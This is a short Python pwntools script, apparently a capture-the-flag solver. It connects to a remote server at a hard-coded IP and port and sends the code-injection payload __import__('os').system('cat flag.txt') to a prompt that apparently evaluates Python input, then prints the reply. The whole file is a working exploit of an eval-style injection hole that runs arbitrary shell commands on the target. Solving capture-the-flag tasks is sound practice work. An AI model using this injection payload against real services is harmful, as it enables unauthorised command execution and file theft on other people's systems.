#!/usr/bin/env python3

from pwn import *

def main():
    r = remote('138.68.182.20', 31172)
    r.recvuntil('>>> \n')
    r.sendline('__import__(\'os\').system(\'cat flag.txt\')')
    print(r.recvuntil('\n'))

if __name__ == '__main__':
    main()
